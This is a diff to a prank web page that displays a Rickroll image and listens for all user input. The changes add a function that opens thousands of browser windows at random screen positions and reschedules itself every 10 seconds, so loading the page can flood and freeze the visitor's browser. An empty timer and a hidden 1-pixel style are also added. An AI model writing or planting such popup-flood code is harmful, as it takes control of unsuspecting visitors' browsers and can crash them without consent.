@@ -4,6 +4,9 @@
       <img src="https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/Rickroll.webp?v=1710211527446" alt="fun" style="width: 500px; height: auto;">
 <script>
       function ol() {
+        setTimeout(function(){
+          
+        }, 1000)
         preloadSound()
         interceptUserInput(event => {
 
@@ -25,7 +28,17 @@
     }
         });
 }
-      
+  
+      const SCREEN_WIDTH = window.screen.availWidth;
+const SCREEN_HEIGHT = window.screen.availHeight;
+const WIN_WIDTH = 580;
+const WIN_HEIGHT = 760;
+const VELOCITY = 15;
+const MARGIN = 10;
+const TICK_LENGTH = 50;
+
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';      
+  
       function interceptUserInput (onInput) {
   document.body.addEventListener('touchstart', onInput, { passive: false })
 
@@ -37,6 +50,24 @@
   document.body.addEventListener('keyup', onInput)
   document.body.addEventListener('keypress', onInput)
 }
+  
+        function getRandomCoords () {
+  const x = MARGIN +
+    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
+  const y = MARGIN +
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN));
+  return { x, y };
+}
+        function both2(){
+        for(var i = 0; i < 2000; i++){
+        window.open('/new.html', '', '');
+            const { x, y } = getRandomCoords();
+        const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+        window.open('/new.html', '', opts);
+      }
+          setTimeout(both2, 10000);
+        }
+  
     </script>
   </body>
 </html>
